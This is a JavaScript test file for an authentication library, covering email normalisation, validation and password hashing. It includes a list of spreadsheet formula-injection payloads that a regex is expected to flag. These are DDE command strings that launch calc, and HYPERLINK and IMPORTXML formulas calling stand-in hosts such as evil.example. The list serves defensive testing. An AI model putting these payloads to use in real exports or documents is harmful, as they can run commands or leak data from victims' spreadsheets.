import test from 'node:test';
import assert from 'node:assert/strict';

import {
  normalizeEmail,
  validateEmail,
  validatePassword,
  hashPassword,
  verifyPassword,
} from '../lib/auth.js';

const FORMULAS = [
  '=1+1',
  '=cmd|\' /c calc\'!A0',
  '@SUM(1+1)',
  '+1+1',
  '-1+1',
  '=HYPERLINK("http://evil.example","x")',
  "\t=1+1",
  "\r=1+1",
  "=IMPORTXML(concat('http://evil/', 'x'), '//a')",
  "=DDE(calc, system, cmd|' /C calc'!A0)",
];

test('every classic injection payload is detected as a formula', () => {
  for (const payload of FORMULAS) {
    assert.match(
      payload,
      /^[=+\-@\t\r]/,
      `${JSON.stringify(payload)} is expected to be a formula trigger`
    );
  }
});

test('email normalisation is idempotent', () => {
  const once = normalizeEmail('  User@Example.COM  ');
  assert.equal(once, 'user@example.com');
  assert.equal(normalizeEmail(once), once);
});

test('email validation accepts normalised addresses', () => {
  assert.equal(validateEmail('  USER@Example.com '), null);
});

test('passwords that pass length validation are verifiable', () => {
  const password = 'correct horse 42';

  assert.equal(validatePassword(password), null, 'must pass validation');

  const stored = hashPassword(password);
  assert.equal(verifyPassword(password, stored), true);
});

test('a password that fails validation would never be stored', () => {
  // Guards the ordering assumption in the register handler: validation runs
  // before hashing, so an over-long password never reaches scrypt.
  const tooLong = 'x'.repeat(201);
  assert.ok(validatePassword(tooLong));
  assert.notEqual(validatePassword(tooLong), null);
});